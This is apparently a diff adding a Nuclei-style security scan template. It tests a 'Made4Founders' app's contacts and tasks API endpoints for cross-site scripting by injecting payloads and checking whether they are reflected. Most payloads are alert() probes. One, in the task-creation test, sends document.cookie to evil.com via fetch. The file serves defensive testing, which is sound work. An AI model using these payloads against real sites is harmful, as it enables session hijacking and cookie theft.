@@ -1,0 +1,71 @@
+id: m4f-xss
+
+info:
+  name: Made4Founders - XSS Tests
+  author: security-audit
+  severity: medium
+  description: Tests for Cross-Site Scripting vulnerabilities
+  tags: xss,m4f
+
+http:
+  # Test XSS in contact creation
+  - raw:
+      - |
+        POST /api/contacts HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/json
+
+        {"name":"{{payload}}","email":"test@example.com","notes":"{{payload}}"}
+
+    payloads:
+      payload:
+        - "<script>alert('XSS')</script>"
+        - "<img src=x onerror=alert('XSS')>"
+        - "<svg onload=alert('XSS')>"
+        - "javascript:alert('XSS')"
+        - "'-alert(1)-'"
+        - "<body onload=alert('XSS')>"
+
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "<script>"
+          - "onerror="
+          - "onload="
+          - "javascript:"
+        condition: or
+        part: body
+
+  # Test XSS in task creation
+  - raw:
+      - |
+        POST /api/tasks HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/json
+
+        {"title":"{{payload}}","description":"{{payload}}","board_id":1}
+
+    payloads:
+      payload:
+        - "<script>alert(document.cookie)</script>"
+        - "<img src=x onerror='fetch(\"https://evil.com/\"+document.cookie)'>"
+
+    attack: pitchfork
+
+    matchers:
+      - type: word
+        words:
+          - "<script>"
+          - "onerror="
+        condition: or
+        part: body
